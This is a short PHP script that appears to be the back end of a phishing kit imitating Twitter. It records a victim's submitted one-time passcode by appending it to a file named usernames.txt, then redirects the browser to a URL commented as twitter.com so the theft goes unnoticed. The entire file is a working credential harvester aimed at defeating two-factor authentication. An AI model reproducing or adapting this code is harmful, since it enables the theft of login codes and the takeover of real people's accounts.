<?php

    file_put_contents("usernames.txt", "OTP: " . $_POST['challenge_response'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://twitter.com
header("Location: $url");
exit();